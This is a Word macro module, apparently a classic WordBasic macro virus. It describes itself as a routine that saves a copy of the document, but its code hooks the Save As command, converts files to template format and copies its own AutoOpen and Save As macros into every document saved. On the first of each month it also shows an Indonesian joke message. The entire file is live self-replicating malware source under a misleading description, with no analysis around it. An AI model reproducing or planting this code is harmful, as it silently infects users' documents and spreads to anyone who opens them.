   Attribute VB_Name = "Joea"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Joea.MAIN"
   Dim sMe$
   Dim sMacro$
   On Error GoTo -1: On Error GoTo Bali
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Jua", sMacro$
   sMacro$ = sMe$ + ":Joea"
   WordBasic.MacroCopy "Global:FileSaveAs", sMacro$
   If WordBasic.Day(WordBasic.Now()) = 1 Then
   WordBasic.MsgBox "Tanggal satu, baru gajian nih ye, cerah sekali deh senyumnya."
   End If
   WordBasic.FileSaveAs dlg
   GoTo Done
   Bali:
   If Err.Number <> 102 Then
   WordBasic.FileSaveAs dlg
   End If
   Done:
   End Sub
